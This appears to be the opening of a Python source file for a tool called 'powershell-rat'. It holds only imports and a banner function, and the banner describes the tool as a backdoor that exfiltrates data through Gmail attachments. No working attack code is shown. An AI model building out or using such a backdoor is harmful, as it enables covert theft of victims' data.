#!/usr/bin/env python3
# -*- coding: utf -*- 

# imports
import os
import sys
import subprocess
from subprocess import check_output

# logo function
def logo():
	logo = '''

	powershell-rat

	[*] Author: krisna pranav
	[*] Twitter: krishpranav5
	[*] Descrption: Python based backdoor that uses Gmail to exfiltrate data as an attachment
	[*] Python version: 3.6.3
	[*] Powershell version: 5.1
	'''

	return logo

